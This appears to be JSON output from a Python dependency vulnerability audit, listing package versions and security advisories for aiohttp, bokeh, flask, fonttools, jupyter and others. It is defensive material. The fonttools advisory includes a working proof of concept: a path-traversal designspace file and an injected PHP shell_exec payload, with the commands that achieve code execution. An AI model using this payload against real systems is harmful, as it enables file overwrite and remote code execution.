
Found 32 known vulnerabilities in 19 packages
{"dependencies": [{"name": "aiobotocore", "version": "2.19.0", "vulns": []}, {"name": "aiohappyeyeballs", "version": "2.4.4", "vulns": []}, {"name": "aiohttp", "version": "3.11.10", "vulns": [{"id": "CVE-2025-53643", "fix_versions": ["3.12.14"], "aliases": ["GHSA-9548-qrrj-x5pj"], "description": "### Summary The Python parser is vulnerable to a request smuggling vulnerability due to not parsing trailer sections of an HTTP request.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/e8d774f635dc6d1cd3174d0e38891da5de0e2b6a"}, {"id": "CVE-2025-69223", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6mq8-rvhq-8wgg"], "description": "### Summary A zip bomb can be used to execute a DoS against the aiohttp server.  ### Impact An attacker may be able to send a compressed request that when decompressed by aiohttp could exhaust the host's memory.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/2b920c39002cee0ec5b402581779bbaaf7c9138a"}, {"id": "CVE-2025-69224", "fix_versions": ["3.13.3"], "aliases": ["GHSA-69f9-5gxw-wvc2"], "description": "### Summary The Python HTTP parser may allow a request smuggling attack with the presence of non-ASCII characters.  ### Impact If a pure Python version of aiohttp is installed (i.e. without the usual C extensions) or AIOHTTP_NO_EXTENSIONS is enabled, then an attacker may be able to execute a request smuggling attack to bypass certain firewalls or proxy protections.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/32677f2adfd907420c078dda6b79225c6f4ebce0"}, {"id": "CVE-2025-69228", "fix_versions": ["3.13.3"], "aliases": ["GHSA-6jhg-hg63-jvvf"], "description": "### Summary A request can be crafted in such a way that an aiohttp server's memory fills up uncontrollably during processing.  ### Impact If an application includes a handler that uses the `Request.post()` method, an attacker may be able to freeze the server by exhausting the memory.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/b7dbd35375aedbcd712cbae8ad513d56d11cce60"}, {"id": "CVE-2025-69229", "fix_versions": ["3.13.3"], "aliases": ["GHSA-g84x-mcqj-x9qq"], "description": "### Summary  Handling of chunked messages can result in excessive blocking CPU usage when receiving a large number of chunks.  ### Impact  If an application makes use of the `request.read()` method in an endpoint, it may be possible for an attacker to cause the server to spend a moderate amount of blocking CPU time (e.g. 1 second) while processing the request. This could potentially lead to DoS as the server would be unable to handle other requests during that time.  -----  Patch: https://github.com/aio-libs/aiohttp/commit/dc3170b56904bdf814228fae70a5501a42a6c712 Patch: https://github.com/aio-libs/aiohttp/commit/4ed97a4e46eaf61bd0f05063245f613469700229"}, {"id": "CVE-2025-69230", "fix_versions": ["3.13.3"], "aliases": ["GHSA-fh55-r93g-j68g"], "description": "### Summary Reading multiple invalid cookies can lead to a logging storm.  ### Impact If the ``cookies`` attribute is accessed in an application, then an attacker may be able to trigger a storm of warning-level logs using a specially crafted Cookie header.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/64629a0834f94e46d9881f4e99c41a137e1f3326"}, {"id": "CVE-2025-69226", "fix_versions": ["3.13.3"], "aliases": ["GHSA-54jq-c3m8-4m76"], "description": "### Summary Path normalization for static files prevents path traversal, but opens up the ability for an attacker to ascertain the existence of absolute path components.  ### Impact If an application uses `web.static()` (not recommended for production deployments), it may be possible for an attacker to ascertain the existence of path components.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/f2a86fd5ac0383000d1715afddfa704413f0711e"}, {"id": "CVE-2025-69227", "fix_versions": ["3.13.3"], "aliases": ["GHSA-jj3x-wxrx-4x23"], "description": "### Summary When assert statements are bypassed, an infinite loop can occur, resulting in a DoS attack when processing a POST body.  ### Impact If optimisations are enabled (`-O` or `PYTHONOPTIMIZE=1`), and the application includes a handler that uses the `Request.post()` method, then an attacker may be able to execute a DoS attack with a specially crafted message.  ------  Patch: https://github.com/aio-libs/aiohttp/commit/bc1319ec3cbff9438a758951a30907b072561259"}, {"id": "CVE-2025-69225", "fix_versions": ["3.13.3"], "aliases": ["GHSA-mqqc-3gqh-h2x8"], "description": "### Summary  The parser allows non-ASCII decimals to be present in the Range header.  ### Impact  There is no known impact, but there is the possibility that there's a method to exploit a request smuggling vulnerability.  ----  Patch: https://github.com/aio-libs/aiohttp/commit/c7b7a044f88c71cefda95ec75cdcfaa4792b3b96"}]}, {"name": "aioitertools", "version": "0.7.1", "vulns": []}, {"name": "aiosignal", "version": "1.2.0", "vulns": []}, {"name": "alabaster", "version": "0.7.16", "vulns": []}, {"name": "alembic", "version": "1.18.1", "vulns": []}, {"name": "altair", "version": "5.5.0", "vulns": []}, {"name": "anaconda-anon-usage", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-anon-usage (0.7.1)"}, {"name": "anaconda-auth", "version": "0.8.6", "vulns": []}, {"name": "anaconda-catalogs", "version": "0.2.0", "vulns": []}, {"name": "anaconda-cli-base", "version": "0.5.2", "vulns": []}, {"name": "anaconda-client", "version": "1.13.0", "vulns": []}, {"name": "anaconda-navigator", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-navigator (2.6.6)"}, {"name": "anaconda-project", "skip_reason": "Dependency not found on PyPI and could not be audited: anaconda-project (0.11.1)"}, {"name": "annotated-types", "version": "0.6.0", "vulns": []}, {"name": "anyio", "version": "4.7.0", "vulns": []}, {"name": "appdirs", "version": "1.4.4", "vulns": []}, {"name": "archspec", "version": "0.2.3", "vulns": []}, {"name": "argon2-cffi", "version": "21.3.0", "vulns": []}, {"name": "argon2-cffi-bindings", "version": "21.2.0", "vulns": []}, {"name": "arrow", "version": "1.3.0", "vulns": []}, {"name": "astroid", "version": "3.3.8", "vulns": []}, {"name": "astropy", "version": "7.0.0", "vulns": []}, {"name": "astropy-iers-data", "version": "0.2025.1.13.0.34.51", "vulns": []}, {"name": "asttokens", "version": "3.0.0", "vulns": []}, {"name": "async-lru", "version": "2.0.4", "vulns": []}, {"name": "asyncssh", "version": "2.17.0", "vulns": []}, {"name": "atomicwrites", "version": "1.4.0", "vulns": []}, {"name": "attrs", "version": "24.3.0", "vulns": []}, {"name": "authlib", "version": "1.6.6", "vulns": []}, {"name": "automat", "version": "24.8.1", "vulns": []}, {"name": "autopep8", "version": "2.0.4", "vulns": []}, {"name": "babel", "version": "2.16.0", "vulns": []}, {"name": "bandit", "version": "1.9.2", "vulns": []}, {"name": "bcrypt", "version": "4.3.0", "vulns": []}, {"name": "beautifulsoup4", "version": "4.12.3", "vulns": []}, {"name": "binaryornot", "version": "0.4.4", "vulns": []}, {"name": "black", "version": "24.10.0", "vulns": []}, {"name": "bleach", "version": "6.2.0", "vulns": []}, {"name": "blinker", "version": "1.9.0", "vulns": []}, {"name": "bokeh", "version": "3.6.2", "vulns": [{"id": "CVE-2026-21883", "fix_versions": ["3.8.2"], "aliases": ["GHSA-793v-589g-574v"], "description": "This vulnerability allows for **Cross-Site WebSocket Hijacking (CSWSH)** of a deployed Bokeh server instance.   ### Scope  This vulnerability is only relevant to deployed Bokeh server instances. There is no impact on static HTML output, standalone embedded plots, or Jupyter notebook usage.   This vulnerability does not prevent any requirements for up-front authentication on Bokeh servers that have authentication hooks in place, and cannot be used to make Bokeh servers deployed on private, internal networks accessible outside those networks.   ### Impact  If a Bokeh server is configured with an allowlist (e.g., `dashboard.corp`), an attacker can register a domain like `dashboard.corp.attacker.com` (or use a subdomain if applicable) and lure a victim to visit it. The malicious site can then initiate a WebSocket connection to the vulnerable Bokeh server. Since the Origin header (e.g., `http://dashboard.corp.attacker.com/`) matches the allowlist according to the flawed logic, the connection is accepted.  Once connected, the attacker can interact with the Bokeh server on behalf of the victim, potentially accessing sensitive data, or modifying visualizations.  ### Patches Patched in versions 3.8.2 and later.  ### Workarounds  None  ### Technical description  The `match_host` function in `src/bokeh/server/util.py` contains a flaw in how it compares hostnames against the allowlist patterns. The function uses Python's `zip()` function to iterate over the parts of the hostname and the pattern simultaneously. However, `zip()` stops iteration when the shortest iterable is exhausted.  Because the code only checks if the *pattern* is longer than the *host* (lines 232-233), but fails to check if the *host* is longer than the *pattern*, a host that **starts** with the pattern (but has additional segments) will successfully match.  For example, if the allowlist is configured to `['[example.com](http://example.com/)']`, the function will incorrectly validate `[example.com.bad.com](http://example.com.evil.com/)` as a match: 1. `host` parts: `['example', 'com', 'bad', 'com']` 2. `pattern` parts: `['example', 'com']` 3. `zip` compares `example==example` (OK) and `com==com` (OK). 4. Iteration stops, and the function returns `True`."}]}, {"name": "boltons", "version": "24.1.0", "vulns": []}, {"name": "boolean-py", "version": "5.0", "vulns": []}, {"name": "botocore", "version": "1.36.3", "vulns": []}, {"name": "bottleneck", "version": "1.4.2", "vulns": []}, {"name": "brotli", "version": "1.0.9", "vulns": [{"id": "CVE-2025-6176", "fix_versions": ["1.2.0"], "aliases": ["GHSA-2qfp-q593-8484"], "description": "Scrapy versions up to 2.13.3 are vulnerable to a denial of service (DoS) attack due to a flaw in its brotli decompression implementation. The protection mechanism against decompression bombs fails to mitigate the brotli variant, allowing remote servers to crash clients with less than 80GB of available memory. This occurs because brotli can achieve extremely high compression ratios for zero-filled data, leading to excessive memory consumption during decompression. Mitigation for this vulnerability needs security enhancement added in brotli v1.2.0."}]}, {"name": "cachecontrol", "version": "0.14.4", "vulns": []}, {"name": "cachetools", "version": "5.5.1", "vulns": []}, {"name": "certifi", "version": "2025.11.12", "vulns": []}, {"name": "cffi", "version": "1.17.1", "vulns": []}, {"name": "cfgv", "version": "3.5.0", "vulns": []}, {"name": "chardet", "version": "4.0.0", "vulns": []}, {"name": "charset-normalizer", "version": "3.3.2", "vulns": []}, {"name": "click", "version": "8.1.8", "vulns": []}, {"name": "cloudpickle", "version": "3.0.0", "vulns": []}, {"name": "colorama", "version": "0.4.6", "vulns": []}, {"name": "colorcet", "version": "3.1.0", "vulns": []}, {"name": "comm", "version": "0.2.1", "vulns": []}, {"name": "conda", "skip_reason": "Dependency not found on PyPI and could not be audited: conda (25.7.0)"}, {"name": "conda-anaconda-telemetry", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-anaconda-telemetry (0.1.2)"}, {"name": "conda-anaconda-tos", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-anaconda-tos (0.2.0)"}, {"name": "conda-build", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-build (25.5.0)"}, {"name": "conda-content-trust", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-content-trust (0.2.0)"}, {"name": "conda-index", "version": "0.6.1", "vulns": []}, {"name": "conda-libmamba-solver", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-libmamba-solver (25.4.0)"}, {"name": "conda-pack", "version": "0.7.1", "vulns": []}, {"name": "conda-package-handling", "version": "2.4.0", "vulns": []}, {"name": "conda-package-streaming", "version": "0.11.0", "vulns": []}, {"name": "conda-repo-cli", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-repo-cli (1.0.165)"}, {"name": "conda-token", "skip_reason": "Dependency not found on PyPI and could not be audited: conda-token (0.6.0)"}, {"name": "constantly", "version": "23.10.4", "vulns": []}, {"name": "contourpy", "version": "1.3.1", "vulns": []}, {"name": "cookiecutter", "version": "1.7.3", "vulns": [{"id": "PYSEC-2022-204", "fix_versions": ["2.1.1"], "aliases": ["CVE-2022-24065", "GHSA-f4q6-9qm4-h8j4", "SNYK-PYTHON-COOKIECUTTER-2414281"], "description": "The package cookiecutter before 2.1.1 are vulnerable to Command Injection via hg argument injection. When calling the cookiecutter function from Python code with the checkout parameter, it is passed to the hg checkout command in a way that additional flags can be set. The additional flags can be used to perform a command injection."}]}, {"name": "coverage", "version": "7.13.1", "vulns": []}, {"name": "cryptography", "version": "44.0.1", "vulns": []}, {"name": "cssselect", "version": "1.2.0", "vulns": []}, {"name": "cycler", "version": "0.11.0", "vulns": []}, {"name": "cyclonedx-python-lib", "version": "11.6.0", "vulns": []}, {"name": "cytoolz", "version": "1.0.1", "vulns": []}, {"name": "dask", "version": "2025.2.0", "vulns": []}, {"name": "dask-expr", "version": "2.0.0", "vulns": []}, {"name": "datashader", "version": "0.18.0", "vulns": []}, {"name": "debugpy", "version": "1.8.11", "vulns": []}, {"name": "decorator", "version": "5.1.1", "vulns": []}, {"name": "defusedxml", "version": "0.7.1", "vulns": []}, {"name": "deprecated", "version": "1.2.13", "vulns": []}, {"name": "diff-match-patch", "version": "20200713", "vulns": []}, {"name": "dill", "version": "0.3.8", "vulns": []}, {"name": "distlib", "version": "0.4.0", "vulns": []}, {"name": "distributed", "version": "2025.2.0", "vulns": [{"id": "CVE-2026-23528", "fix_versions": ["2026.1.1"], "aliases": ["GHSA-c336-7962-wfj2"], "description": "### Impact When [Jupyter Lab](https://jupyterlab.readthedocs.io/en/latest/), [jupyter-server-proxy](https://github.com/jupyterhub/jupyter-server-proxy) and [Dask distributed](https://github.com/dask/distributed) are all run together it is possible to craft a URL which will result in code being executed by Jupyter due to a cross-side-scripting (XSS) bug in the Dask dashboard.  It is possible for attackers to craft a phishing URL that assumes Jupyter Lab and Dask may be running on localhost and using default ports. If a user clicks on the malicious link it will open an error page in the Dask Dashboard via the Jupyter Lab proxy which will cause code to be executed by the default Jupyter Python kernel.  In order for a user to be impacted they must be running Jupyter Lab locally on the default port (with the [jupyter-server-proxy](https://github.com/jupyterhub/jupyter-server-proxy)) and a Dask distributed cluster on the default port. Then they would need to click the link which would execute the malicious code.  ### Patches This has been fixed in the `2026.1.1` release. All users should upgrade to this version.  ### Mitigations There are no known workarounds for this bug. The only complete solution is to upgrade to a newer release of Dask. However, there are a few things you could do to reduce your risk.  It is possible to avoid code execution via Jupyter by uninstalling the [jupyter-server-proxy](https://github.com/jupyterhub/jupyter-server-proxy) and accessing the Dask dashboard directly at it's URL. However, it is still possible for an attacker to craft a URL that executes JavaScript in the user's browser in the Dask dashboard. Which is still a moderate vulnerability. Therefore we recommend all users upgrade to the latest Dask release.  Another potential mitigation is to ensure both Jupyter and the Dask dashboard are running on non-standard ports. While this doesn't resolve the problem it reduces the chance of this being exploited. If an attacker knew which ports you were using they could still craft a malicious URL, but it would require a more targeted attack."}]}, {"name": "distro", "version": "1.9.0", "vulns": []}, {"name": "docstring-to-markdown", "version": "0.11", "vulns": []}, {"name": "docutils", "version": "0.21.2", "vulns": []}, {"name": "dparse", "version": "0.6.4", "vulns": []}, {"name": "et-xmlfile", "version": "1.1.0", "vulns": []}, {"name": "evalidate", "version": "2.0.3", "vulns": []}, {"name": "executing", "version": "0.8.3", "vulns": []}, {"name": "fastjsonschema", "version": "2.20.0", "vulns": []}, {"name": "filelock", "version": "3.20.3", "vulns": []}, {"name": "flake8", "version": "7.1.1", "vulns": []}, {"name": "flask", "version": "3.1.0", "vulns": [{"id": "CVE-2025-47278", "fix_versions": ["3.1.1"], "aliases": ["GHSA-4grg-w6v8-c28g"], "description": "In Flask 3.1.0, the way fallback key configuration was handled resulted in the last fallback key being used for signing, rather than the current signing key.  Signing is provided by the `itsdangerous` library. A list of keys can be passed, and it expects the last (top) key in the list to be the most recent key, and uses that for signing. Flask was incorrectly constructing that list in reverse, passing the signing key first.  Sites that have opted-in to use key rotation by setting `SECRET_KEY_FALLBACKS` are likely to unexpectedly be signing their sessions with stale keys, and their transition to fresher keys will be impeded. Sessions are still signed, so this would not cause any sort of data integrity loss."}]}, {"name": "fonttools", "version": "4.55.3", "vulns": [{"id": "CVE-2025-66034", "fix_versions": ["4.60.2"], "aliases": ["GHSA-768j-98cg-p3fv"], "description": "## Summary  The `fonttools varLib` (or `python3 -m fontTools.varLib`) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the `main()` code path of `fontTools.varLib`, used by the fonttools varLib CLI and any code that invokes `fontTools.varLib.main()`.  The vulnerability exists due to unsanitised filename handling combined with content injection. Attackers can write files to arbitrary filesystem locations via path traversal sequences, and inject malicious code (like PHP) into the output files through XML injection in labelname elements. When these files are placed in web-accessible locations and executed, this achieves remote code execution without requiring any elevated privileges. Once RCE is obtained, attackers can further escalate privileges to compromise system files (like overwriting `/etc/passwd`).  Overall this allows attackers to: - Write font files to arbitrary locations on the filesystem - Overwrite configuration files - Corrupt application files and dependencies - Obtain remote code execution  The attacker controls the file location, extension and contents which could lead to remote code execution as well as enabling a denial of service through file corruption means.  ## Affected Lines  `fontTools/varLib/__init__.py` ```python filename = vf.filename # Unsanitised filename output_path = os.path.join(output_dir, filename) # Path traversal vf.save(output_path) # Arbitrary file write ```  ## PoC 1. Set up `malicious.designspace` and respective `source-*.ttf` files in a directory like `/Users/<username>/testing/demo/` (will impact relative file location within malicious.designspace)  `setup.py` ```python #!/usr/bin/env python3 import os  from fontTools.fontBuilder import FontBuilder from fontTools.pens.ttGlyphPen import TTGlyphPen  def create_source_font(filename, weight=400):     fb = FontBuilder(unitsPerEm=1000, isTTF=True)     fb.setupGlyphOrder([\".notdef\"])     fb.setupCharacterMap({})          pen = TTGlyphPen(None)     pen.moveTo((0, 0))     pen.lineTo((500, 0))     pen.lineTo((500, 500))     pen.lineTo((0, 500))     pen.closePath()          fb.setupGlyf({\".notdef\": pen.glyph()})     fb.setupHorizontalMetrics({\".notdef\": (500, 0)})     fb.setupHorizontalHeader(ascent=800, descent=-200)     fb.setupOS2(usWeightClass=weight)     fb.setupPost()     fb.setupNameTable({\"familyName\": \"Test\", \"styleName\": f\"Weight{weight}\"})     fb.save(filename)  if __name__ == '__main__':     os.chdir(os.path.dirname(os.path.abspath(__file__)))     create_source_font(\"source-light.ttf\", weight=100)     create_source_font(\"source-regular.ttf\", weight=400) ```  `malicious.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format=\"5.0\">   <axes>     <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/>   </axes>      <sources>     <source filename=\"source-light.ttf\" name=\"Light\">       <location>         <dimension name=\"Weight\" xvalue=\"100\"/>       </location>     </source>     <source filename=\"source-regular.ttf\" name=\"Regular\">       <location>         <dimension name=\"Weight\" xvalue=\"400\"/>       </location>     </source>   </sources>      <!-- Filename can be arbitrarily set to any path on the filesystem -->   <variable-fonts>     <variable-font name=\"MaliciousFont\" filename=\"../../tmp/newarbitraryfile.json\">       <axis-subsets>         <axis-subset name=\"Weight\"/>       </axis-subsets>     </variable-font>   </variable-fonts> </designspace> ```  Optional: You can put a file with any material within `../../tmp/newarbitraryfile.json` in advance, the contents in the file will be overwritten after running the setup script in the following step.  2. Run the setup.py script to generate `source-*.tff` files required for the malicious.designspace file. ```bash python3 setup.py ``` 3. Execute the given payload using the vulnerable varLib saving the file into the arbitrary file location of filename ```bash fonttools varLib malicious.designspace ``` 4. Validate arbitrary file write was performed by looking at path assigned within malicious designspace ```bash cat {{filename_location}} ``` 5. After validating that we can provide arbitrary write to any location, we can also validate that we can control sections of content as well demonstrated with the below payload.  `malicious2.designspace` ```xml <?xml version='1.0' encoding='UTF-8'?> <designspace format=\"5.0\"> \t<axes>         <!-- XML injection occurs in labelname elements with CDATA sections --> \t    <axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"> \t        <labelname xml:lang=\"en\"><![CDATA[<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]]]><![CDATA[>]]></labelname> \t        <labelname xml:lang=\"fr\">MEOW2</labelname> \t    </axis> \t</axes> \t<axis tag=\"wght\" name=\"Weight\" minimum=\"100\" maximum=\"900\" default=\"400\"/> \t<sources> \t\t<source filename=\"source-light.ttf\" name=\"Light\"> \t\t\t<location> \t\t\t\t<dimension name=\"Weight\" xvalue=\"100\"/> \t\t\t</location> \t\t</source> \t\t<source filename=\"source-regular.ttf\" name=\"Regular\"> \t\t\t<location> \t\t\t\t<dimension name=\"Weight\" xvalue=\"400\"/> \t\t\t</location> \t\t</source> \t</sources> \t<variable-fonts> \t\t<variable-font name=\"MyFont\" filename=\"output.ttf\"> \t\t\t<axis-subsets> \t\t\t\t<axis-subset name=\"Weight\"/> \t\t\t</axis-subsets> \t\t</variable-font> \t</variable-fonts> \t<instances> \t\t<instance name=\"Display Thin\" familyname=\"MyFont\" stylename=\"Thin\"> \t\t\t<location><dimension name=\"Weight\" xvalue=\"100\"/></location> \t\t\t<labelname xml:lang=\"en\">Display Thin</labelname> \t\t</instance> \t</instances> </designspace> ```  6. When the program is run, we can show we control the contents in the new file ```bash fonttools varLib malicious2.designspace -o file123 ``` Here being outputted to a localised area ignoring filename presented in variable-font  7. We can look inside file123 to validate user controlled injection ```bash cat file123 ``` to show `<?php echo shell_exec(\"/usr/bin/touch /tmp/MEOW123\");?>]]>`  8. Executing the file and reading looking at the newly generated file ```bash php file123 ls -la /tmp/MEOW123 ``` we can see that the file was just created showing RCE.  ## Recommendations  - Ensure output file paths configured within designspace files are restricted to the local directory or consider further security measures to prevent arbitrary file write/overwrite within any directory on the system"}]}, {"name": "frozendict", "version": "2.4.2", "vulns": []}, {"name": "frozenlist", "version": "1.5.0", "vulns": []}, {"name": "fsspec", "version": "2025.3.2", "vulns": []}, {"name": "gitdb", "version": "4.0.7", "vulns": []}, {"name": "gitpython", "version": "3.1.43", "vulns": []}, {"name": "gmpy2", "version": "2.2.1", "vulns": []}, {"name": "greenlet", "version": "3.1.1", "vulns": []}, {"name": "h11", "version": "0.16.0", "vulns": []}, {"name": "h5py", "version": "3.12.1", "vulns": []}, {"name": "heapdict", "version": "1.0.1", "vulns": []}, {"name": "holoviews", "version": "1.20.2", "vulns": []}, {"name": "httpcore", "version": "1.0.9", "vulns": []}, {"name": "httpx", "version": "0.28.1", "vulns": []}, {"name": "hvplot", "version": "0.11.3", "vulns": []}, {"name": "hyperlink", "version": "21.0.0", "vulns": []}, {"name": "identify", "version": "2.6.16", "vulns": []}, {"name": "idna", "version": "3.7", "vulns": []}, {"name": "imageio", "version": "2.37.0", "vulns": []}, {"name": "imagesize", "version": "1.4.1", "vulns": []}, {"name": "imbalanced-learn", "version": "0.13.0", "vulns": []}, {"name": "importlib-metadata", "version": "8.5.0", "vulns": []}, {"name": "incremental", "version": "24.7.2", "vulns": []}, {"name": "inflection", "version": "0.5.1", "vulns": []}, {"name": "iniconfig", "version": "1.1.1", "vulns": []}, {"name": "intake", "version": "2.0.7", "vulns": []}, {"name": "intervaltree", "version": "3.1.0", "vulns": []}, {"name": "ipdb", "version": "0.13.13", "vulns": []}, {"name": "ipykernel", "version": "6.29.5", "vulns": []}, {"name": "ipython", "version": "8.30.0", "vulns": []}, {"name": "ipywidgets", "version": "8.1.5", "vulns": []}, {"name": "isort", "version": "6.0.1", "vulns": []}, {"name": "itemadapter", "version": "0.3.0", "vulns": []}, {"name": "itemloaders", "version": "1.3.2", "vulns": []}, {"name": "itsdangerous", "version": "2.2.0", "vulns": []}, {"name": "jaraco-classes", "version": "3.2.1", "vulns": []}, {"name": "jaraco-context", "skip_reason": "Dependency not found on PyPI and could not be audited: jaraco-context (0.0.0)"}, {"name": "jaraco-functools", "version": "4.1.0", "vulns": []}, {"name": "jedi", "version": "0.19.2", "vulns": []}, {"name": "jeepney", "version": "0.7.1", "vulns": []}, {"name": "jellyfish", "version": "1.1.3", "vulns": []}, {"name": "jinja2", "version": "3.1.6", "vulns": []}, {"name": "jinja2-time", "version": "0.2.0", "vulns": []}, {"name": "jmespath", "version": "1.0.1", "vulns": []}, {"name": "joblib", "version": "1.4.2", "vulns": []}, {"name": "json5", "version": "0.9.25", "vulns": []}, {"name": "jsonpatch", "version": "1.33", "vulns": []}, {"name": "jsonpointer", "version": "2.1", "vulns": []}, {"name": "jsonschema", "version": "4.23.0", "vulns": []}, {"name": "jsonschema-specifications", "version": "2023.7.1", "vulns": []}, {"name": "jupyter", "version": "1.1.1", "vulns": []}, {"name": "jupyter-client", "version": "8.6.3", "vulns": []}, {"name": "jupyter-console", "version": "6.6.3", "vulns": []}, {"name": "jupyter-core", "version": "5.7.2", "vulns": [{"id": "CVE-2025-30167", "fix_versions": ["5.8.1"], "aliases": ["GHSA-33p9-3p43-82vq"], "description": "## Impact  On Windows, the shared `%PROGRAMDATA%` directory is searched for configuration files (`SYSTEM_CONFIG_PATH` and `SYSTEM_JUPYTER_PATH`), which may allow users to create configuration files affecting other users.  Only shared Windows systems with multiple users and unprotected `%PROGRAMDATA%` are affected.  ## Mitigations  - upgrade to `jupyter_core>=5.8.1` (5.8.0 is patched but breaks `jupyter-server`) , or - as administrator, modify the permissions on the `%PROGRAMDATA%` directory so it is not writable by unauthorized users, or - as administrator, create the `%PROGRAMDATA%\\jupyter` directory with appropriately restrictive permissions, or - as user or administrator, set the `%PROGRAMDATA%` environment variable to a directory with appropriately restrictive permissions (e.g. controlled by administrators _or_ the current user)  ## Credit  Reported via Trend Micro Zero Day Initiative as ZDI-CAN-25932"}]}, {"name": "jupyter-events", "version": "0.12.0", "vulns": []}, {"name": "jupyter-lsp", "version": "2.2.5", "vulns": []}, {"name": "jupyter-server", "version": "2.15.0", "vulns": []}, {"name": "jupyter-server-terminals", "version": "0.5.3", "vulns": []}, {"name": "jupyterlab", "version": "4.3.4", "vulns": [{"id": "CVE-2025-59842", "fix_versions": ["4.4.8"], "aliases": ["GHSA-vvfj-2jqx-52jm"], "description": "Links generated with LaTeX typesetters in Markdown files and Markdown cells in JupyterLab and Jupyter Notebook did not include the `noopener` attribute.  This is deemed to have no impact on the default installations. Theoretically users of third-party LaTeX-rendering extensions could find themselves vulnerable to reverse tabnabbing attacks if: - links generated by those extensions included `target=_blank` (no such extensions are known at time of writing) and - they were to click on a link generated in LaTeX (typically visibly different from other links).  For consistency with handling on other links, new versions of JupyterLab will enforce `noopener` and `target=_blank` on all links generated by typesetters. The former will harden the resilience of JupyterLab to extensions with lack of secure defaults in link rendering, and the latter will improve user experience by preventing accidental state loss when clicking on links rendered by LaTeX typesetters.  ### Impact  Since the official LaTeX typesetter extensions for JupyterLab: `jupyterlab-mathjax` (default), `jupyterlab-mathjax2` and `jupyterlab-katex` do not include the `target=_blank`, there is no impact for JupyterLab users.  ### Patches  JupyterLab 4.4.8  ### Workarounds  No workarounds are necessary.  ### References  None"}]}, {"name": "jupyterlab-pygments", "version": "0.3.0", "vulns": []}, {"name": "jupyterlab-server", "version": "2.27.3", "vulns": []}, {"name": "jupyterlab-widgets", "version": "3.0.13", "vulns": []}, {"name": "keyring", "version": "25.6.0", "vulns": []}, {"name": "kiwisolver", "version": "1.4.8", "vulns": []}, {"name": "lark-oapi", "version": "1.5.2", "vulns": []}, {"name": "lark-service", "skip_reason": "Dependency not found on PyPI and could not be audited: lark-service (0.1.0)"}, {"name": "lazy-loader", "version": "0.4", "vulns": []}, {"name": "lckr-jupyterlab-variableinspector", "version": "3.2.4", "vulns": []}, {"name": "libarchive-c", "version": "5.1", "vulns": []}, {"name": "libmambapy", "skip_reason": "Dependency not found on PyPI and could not be audited: libmambapy (2.0.5)"}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "lief", "version": "0.16.4", "vulns": [{"id": "CVE-2025-15504", "fix_versions": ["0.17.2"], "aliases": ["GHSA-mjjp-xjfg-97wg"], "description": "A security flaw has been discovered in lief-project LIEF up to 0.17.1. Affected by this issue is the function Parser::parse_binary of the file src/ELF/Parser.tcc of the component ELF Binary Parser. The manipulation results in null pointer dereference. The attack must be initiated from a local position. The exploit has been released to the public and may be used for attacks. Upgrading to version 0.17.2 can resolve this issue. The patch is identified as 81bd5d7ea0c390563f1c4c017c9019d154802978. It is recommended to upgrade the affected component."}]}, {"name": "linkify-it-py", "version": "2.0.0", "vulns": []}, {"name": "llvmlite", "version": "0.44.0", "vulns": []}, {"name": "lmdb", "version": "1.6.2", "vulns": []}, {"name": "locket", "version": "1.0.0", "vulns": []}, {"name": "lxml", "version": "5.3.0", "vulns": []}, {"name": "lz4", "version": "4.3.2", "vulns": []}, {"name": "mako", "version": "1.3.10", "vulns": []}, {"name": "markdown", "version": "3.8", "vulns": []}, {"name": "markdown-it-py", "version": "2.2.0", "vulns": []}, {"name": "markupsafe", "version": "3.0.2", "vulns": []}, {"name": "marshmallow", "version": "4.2.0", "vulns": []}, {"name": "matplotlib", "version": "3.10.0", "vulns": []}, {"name": "matplotlib-inline", "version": "0.1.6", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mdit-py-plugins", "version": "0.3.0", "vulns": []}, {"name": "mdurl", "version": "0.1.0", "vulns": []}, {"name": "menuinst", "skip_reason": "Dependency not found on PyPI and could not be audited: menuinst (2.2.0)"}, {"name": "mistune", "version": "3.1.2", "vulns": []}, {"name": "mkl-fft", "version": "1.3.11", "vulns": []}, {"name": "mkl-random", "version": "1.2.8", "vulns": []}, {"name": "mkl-service", "version": "2.4.0", "vulns": []}, {"name": "more-itertools", "version": "10.3.0", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.0.3", "vulns": []}, {"name": "multidict", "version": "6.1.0", "vulns": []}, {"name": "multipledispatch", "version": "0.6.0", "vulns": []}, {"name": "mypy", "version": "1.14.1", "vulns": []}, {"name": "mypy-extensions", "version": "1.0.0", "vulns": []}, {"name": "narwhals", "version": "1.31.0", "vulns": []}, {"name": "navigator-updater", "skip_reason": "Dependency not found on PyPI and could not be audited: navigator-updater (0.5.1)"}, {"name": "nbclient", "version": "0.10.2", "vulns": []}, {"name": "nbconvert", "version": "7.16.6", "vulns": [{"id": "CVE-2025-53000", "fix_versions": [], "aliases": ["GHSA-xm59-rqc7-hhvf"], "description": "### Summary  On Windows, converting a notebook containing SVG output to a PDF results in unauthorized code execution. Specifically, a third party can create a `inkscape.bat` file that defines a [Windows batch script](https://en.wikipedia.org/wiki/Batch_file), capable of arbitrary code execution.  When a user runs 